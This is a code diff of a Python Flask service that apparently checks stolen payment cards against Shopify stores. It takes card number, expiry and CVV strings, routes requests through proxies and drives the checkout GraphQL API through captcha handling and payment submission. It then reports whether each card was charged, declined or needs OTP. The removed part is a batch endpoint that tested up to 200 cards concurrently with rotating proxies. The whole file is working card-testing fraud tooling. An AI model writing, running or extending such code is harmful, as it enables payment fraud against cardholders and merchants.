@@ -150,7 +150,7 @@ async def make_graphql_request_with_captcha_handling(
         except Exception as e:
             if attempt == max_retries:
                 return None, str(e), False
-            await asyncio.sleep(2)
+            await asyncio.sleep(1)
     
     return response, response_text, False
 
@@ -167,14 +167,14 @@ async def fetch_products(domain, proxy_str=None):
         async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
             async with session.get(f"{domain}/products.json", proxy=proxy, timeout=10) as resp:
                 if resp.status != 200:
-                    return False, f"DEAD_SITE"
+                    return False, f"<b>Site Error! Status: {resp.status}</b>"
                 text = await resp.text()
                 if "shopify" not in text.lower():
-                    return False, "NOT_SHOPI"
+                    return False, "<b>Not Shopify!</b>"
 
                 result = (await resp.json())['products']
                 if not result:
-                    return False, "NO_PRODUCTS"
+                    return False, "<b>No Products!</b>"
 
         min_price = float('inf')
         min_product = None
@@ -208,12 +208,12 @@ async def fetch_products(domain, proxy_str=None):
         if isinstance(min_product, dict) and min_product.get('variant_id'):
             return min_product
         else:
-            return False, "NO_VALID_PRODUCTS"
+            return False, "<b>No Valid Products</b>"
 
     except aiohttp.ClientError as e:
-        return False, f"PROXY_ERROR"
+        return False, f"<b>Proxy Error: {str(e)}</b>"
     except Exception as e:
-        return False, f"ERROR"
+        return False, f"error: {str(e)}"
 
 def extract_clean_response(message):
     if not message:
@@ -292,8 +292,8 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 return False, info[1], gateway, total_price, currency
             variant_id = info['variant_id']
 
-        connector = aiohttp.TCPConnector(ssl=False, limit=0, limit_per_host=0)
-        timeout = aiohttp.ClientTimeout(total=15)
+        connector = aiohttp.TCPConnector(ssl=False)
+        timeout = aiohttp.ClientTimeout(total=30)
         
         async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
             url = ourl
@@ -389,7 +389,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 ident_sig = ident_match.group(1)
             
             if not sst:
-                return False, "TOKEN_FAIL", gateway, total_price, currency
+                return False, "Failed to get session token", gateway, total_price, currency
             
             # Add checkout-specific headers for modern Shopify (matching working Go implementation)
             headers.update({
@@ -511,7 +511,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                     session, graphql_url, params, headers, json_data, checkout_url, max_retries=1
                 )
                 if i == 0:
-                    await asyncio.sleep(0.9)
+                    await asyncio.sleep(3)
             
             if not response:
                 return False, f"Request failed: {resp_text}", gateway, total_price, currency
@@ -571,7 +571,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 running_total = running_total_data['value']['amount']
                 
             except (KeyError, TypeError) as e:
-                return False, f"Failed to parse proposal", gateway, total_price, currency
+                return False, f"Failed to parse proposal response: {str(e)}", gateway, total_price, currency
 
             if not delivery_data:
                 return False, "No delivery data in proposal", gateway, total_price, currency
@@ -701,7 +701,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 if not token:
                     return False, 'Unable to get payment token', gateway, total_price, currency
             except Exception as e:
-                return False, f'FAIL_PAYMENT_TOKEN', gateway, total_price, currency
+                return False, f'Unable to get payment token: {str(e)}', gateway, total_price, currency
 
             params = {'operationName': 'SubmitForCompletion'}
             
@@ -866,7 +866,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                         receipt_type = receipt.get('__typename', '')
                         
                         if receipt_type == 'ProcessedReceipt':
-                            return True, "ORDER_PAID", gateway, total_price, currency
+                            return True, "ORDER_PLACED", gateway, total_price, currency
                         
                         rid = receipt.get('id')
                     else:
@@ -915,7 +915,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 'operationName': 'PollForReceipt'
             }
 
-            await asyncio.sleep(0.9)
+            await asyncio.sleep(3)
             
             for i in range(4):
                 response, final_text, captcha_solved = await make_graphql_request_with_captcha_handling(
@@ -934,7 +934,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                         typename = receipt_data.get('__typename', '')
                         
                         if typename == 'ProcessedReceipt':
-                            return True, "ORDER_PAID", gateway, total_price, currency
+                            return True, "ORDER_PLACED", gateway, total_price, currency
                         elif typename == 'FailedReceipt':
                             error = receipt_data.get('processingError', {})
                             error_type = error.get('__typename', '')
@@ -952,14 +952,14 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                             return True, "OTP_REQUIRED", gateway, total_price, currency
                         
                         if receipt_data.get('__typename') in ['ProcessingReceipt', 'WaitingReceipt']:
-                            await asyncio.sleep(2)
+                            await asyncio.sleep(4)
                             continue
                         
                 except Exception as e:
                     pass
                 
                 if 'WaitingReceipt' in final_text:
-                    await asyncio.sleep(2)
+                    await asyncio.sleep(4)
                 else:
                     break
             
@@ -974,7 +974,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 result = res_json.get('data', {}).get('receipt', {}).get('processingError', {}).get('code')
                 
                 if "shopify_payments" in str(res_json):
-                    return True, "ORDER_PAID", gateway, total_price, currency
+                    return True, "ORDER_PLACED", gateway, total_price, currency
                 elif result:
                     return True, result, gateway, total_price, currency
                 else:
@@ -988,7 +988,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             if 'actionreq' in final_lower or 'action_required' in final_lower:
                 return True, f"OTP_REQUIRED", gateway, total_price, currency
             elif 'processedreceipt' in final_lower:
-                return True, f"ORDER_PAID", gateway, total_price, currency
+                return True, f"ORDER_PLACED", gateway, total_price, currency
             elif 'failedreceipt' in final_lower or 'declined' in final_lower:
                 return True, code if code else "CARD_DECLINED", gateway, total_price, currency
             else:
@@ -1008,183 +1008,75 @@ def parse_cc_string(cc_string):
         'cvv': parts[3].strip()
     }
 
-
-# ──────────────────────── Concurrency Engine ────────────────────────
-import threading
-
-MAX_CONCURRENT = 200          # max cards in flight at once
-_loop = None                 # single shared event loop
-_loop_thread = None
-_semaphore = None            # asyncio.Semaphore(MAX_CONCURRENT)
-
-def _start_background_loop(loop):
-    """Run the event loop forever in a background thread."""
-    asyncio.set_event_loop(loop)
-    loop.run_forever()
-
-def get_event_loop():
-    """Return the shared event loop, starting it if needed."""
-    global _loop, _loop_thread, _semaphore
-    if _loop is None or _loop.is_closed():
-        _loop = asyncio.new_event_loop()
-        _semaphore = asyncio.Semaphore(MAX_CONCURRENT)
-        _loop_thread = threading.Thread(target=_start_background_loop, args=(_loop,), daemon=True)
-        _loop_thread.start()
-    return _loop
-
-async def _throttled_process(cc, mes, ano, cvv, site_url, variant_id, proxy_str):
-    """Process a single card, guarded by the concurrency semaphore."""
-    async with _semaphore:
-        return await process_card(cc, mes, ano, cvv, site_url, variant_id, proxy_str)
-
-def _build_result(cc_string, success, message, gateway, price, currency):
-    clean_response = extract_clean_response(message)
-    return {
-        "Gateway": gateway,
-        "Price": float(price) if price.replace('.', '', 1).isdigit() else 0.0,
-        "Response": clean_response,
-        "Status": success,
-        "cc": cc_string
-    }
-
-# ──────────────────────── Flask App ─────────────────────────────────
+async def process_card_async(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None):
+    return await process_card(cc, mes, ano, cvv, site_url, variant_id, proxy_str)
 
 app = Flask(__name__)
 
-# ── Single-card endpoint (backward compatible) ──────────────────────
 @app.route('/shopify', methods=['GET'])
 def shopify_checker():
     try:
         site = request.args.get('site')
         cc_string = request.args.get('cc')
         proxy_str = request.args.get('proxy')
-
+        
         if not site:
-            return jsonify({"error": "Missing 'site' parameter", "status": False}), 400
+            return jsonify({
+                "error": "Missing 'site' parameter",
+                "status": False
+            }), 400
+        
         if not cc_string:
-            return jsonify({"error": "Missing 'cc' parameter in format CC|MM|YYYY|CVV", "status": False}), 400
-
+            return jsonify({
+                "error": "Missing 'cc' parameter in format CC|MM|YYYY|CVV",
+                "status": False
+            }), 400
+        
         try:
             cc_parts = parse_cc_string(cc_string)
+            cc = cc_parts['cc']
+            mes = cc_parts['mes']
+            ano = cc_parts['ano']
+            cvv = cc_parts['cvv']
         except ValueError as e:
-            return jsonify({"error": str(e), "status": False}), 400
-
+            return jsonify({
+                "error": str(e),
+                "status": False
+            }), 400
+        
         variant_id = request.args.get('variant')
-        loop = get_event_loop()
-
-        future = asyncio.run_coroutine_threadsafe(
-            _throttled_process(
-                cc_parts['cc'], cc_parts['mes'], cc_parts['ano'], cc_parts['cvv'],
-                site, variant_id, proxy_str
-            ),
-            loop
-        )
-        success, message, gateway, price, currency = future.result(timeout=120)
-
-        return jsonify(_build_result(cc_string, success, message, gateway, price, currency))
-
+        
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        
+        try:
+            success, message, gateway, price, currency = loop.run_until_complete(
+                process_card_async(cc, mes, ano, cvv, site, variant_id, proxy_str)
+            )
+        finally:
+            loop.close()
+        
+        clean_response = extract_clean_response(message)
+        
+        response_data = {
+            "Gateway": gateway,
+            "Price": float(price) if price.replace('.', '', 1).isdigit() else 0.0,
+            "Response": clean_response,
+            "Status": success,
+            "cc": cc_string
+        }
+        
+        return jsonify(response_data)
+        
     except Exception as e:
         return jsonify({
-            "error": str(e), "status": False,
-            "Gateway": "UNKNOWN", "Price": 0.0,
+            "error": str(e),
+            "status": False,
+            "Gateway": "UNKNOWN",
+            "Price": 0.0,
             "Response": f"ERROR: {str(e)}",
             "cc": request.args.get('cc', '')
         }), 500
 
-# ── Batch endpoint — up to 60 cards concurrently ────────────────────
-@app.route('/batch', methods=['POST'])
-def batch_checker():
-    """
-    POST JSON body:
-    {
-      "site": "https://example.myshopify.com",
-      "cards": ["4111...|12|2030|123", "5200...|06|27|456", ...],
-      "proxy": "host:port:user:pass",
-      "proxies": ["proxy1", "proxy2", ...]
-    }
-    Max 60 cards. If 'proxies' list given, cards rotate across them round-robin.
-    """
-    try:
-        data = request.get_json(force=True)
-        site = data.get('site', '')
-        cards = data.get('cards', [])
-        variant_id = data.get('variant')
-
-        # Proxy list support: round-robin across proxies
-        proxy_list = data.get('proxies', [])
-        single_proxy = data.get('proxy')
-        if not proxy_list and single_proxy:
-            proxy_list = [single_proxy]
-
-        if not site:
-            return jsonify({"error": "Missing 'site' field", "status": False}), 400
-        if not cards or not isinstance(cards, list):
-            return jsonify({"error": "Missing or invalid 'cards' array", "status": False}), 400
-        if len(cards) > MAX_CONCURRENT:
-            return jsonify({"error": f"Max {MAX_CONCURRENT} cards per batch", "status": False}), 400
-
-        # Parse all cards upfront and assign proxies round-robin
-        parsed = []
-        for i, cc_string in enumerate(cards):
-            proxy_for_card = proxy_list[i % len(proxy_list)] if proxy_list else None
-            try:
-                parts = parse_cc_string(cc_string.strip())
-                parsed.append((cc_string.strip(), parts, proxy_for_card))
-            except ValueError:
-                parsed.append((cc_string.strip(), None, proxy_for_card))
-
-        loop = get_event_loop()
-
-        async def _run_batch():
-            tasks = []
-            for cc_string, parts, px in parsed:
-                if parts is None:
-                    async def _bad(cs=cc_string):
-                        return cs, False, "Invalid CC format", "UNKNOWN", "0.00", "USD"
-                    tasks.append(_bad())
-                else:
-                    async def _check(cs=cc_string, p=parts, prx=px):
-                        try:
-                            success, msg, gw, price, cur = await _throttled_process(
-                                p['cc'], p['mes'], p['ano'], p['cvv'],
-                                site, variant_id, prx
-                            )
-                            return cs, success, msg, gw, price, cur
-                        except Exception as ex:
-                            return cs, False, str(ex), "UNKNOWN", "0.00", "USD"
-                    tasks.append(_check())
-
-            return await asyncio.gather(*tasks)
-
-        future = asyncio.run_coroutine_threadsafe(_run_batch(), loop)
-        results = future.result(timeout=60)
-
-        output = []
-        for cc_string, success, message, gateway, price, currency in results:
-            output.append(_build_result(cc_string, success, message, gateway, price, currency))
-
-        return jsonify(output)
-
-    except Exception as e:
-        return jsonify({"error": str(e), "status": False}), 500
-
-# ── Status endpoint ─────────────────────────────────────────────────
-@app.route('/status', methods=['GET'])
-def status():
-    return jsonify({
-        "status": "online",
-        "max_concurrent": MAX_CONCURRENT,
-        "endpoints": {
-            "single": "GET /shopify?site=...&cc=...&proxy=...",
-            "batch":  "POST /batch {site, cards[], proxy}",
-            "status": "GET /status"
-        }
-    })
-
 if __name__ == "__main__":
-    print(f"[ENGINE] Max concurrency: {MAX_CONCURRENT} cards")
-    print(f"[ENGINE] Single: GET /shopify?site=...&cc=...&proxy=...")
-    print(f"[ENGINE] Batch:  POST /batch  {{site, cards[], proxy}}")
-    get_event_loop()  # pre-start the background loop
-    port = int(os.environ.get("PORT", 5000))
-    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
+    app.run(host='0.0.0.0', port=5000, debug=False)
